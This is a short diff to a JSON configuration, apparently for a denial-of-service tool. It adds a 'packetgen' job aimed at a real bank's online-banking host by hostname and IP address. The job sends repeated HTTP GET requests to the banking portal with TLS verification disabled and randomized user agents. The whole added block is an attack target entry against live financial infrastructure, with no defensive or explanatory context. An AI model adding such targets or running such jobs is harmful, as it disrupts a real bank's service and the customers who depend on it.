@@ -10180,6 +10180,36 @@
         }
       },
       "count": 2
+    },
+    {
+      "type": "packetgen",
+      "name": "dbo.nkbank.ru",
+      "args": {
+        "dynamic": false,
+        "connection": {
+          "type": "net",
+          "args": {
+            "protocol": "tcp",
+            "address": "194.84.164.150:443",
+            "tls_config": {
+              "insecure_skip_verify": true
+            }
+          }
+        },
+        "packet": {
+          "payload": {
+            "type": "http",
+            "data": {
+              "method": "GET",
+              "path": "https://dbo.nkbank.ru/ibank2/",
+              "headers": {
+                "User-Agent": "{{ random_user_agent }}"
+              }
+            }
+          }
+        }
+      },
+      "count": 2
     }
   ]
 }
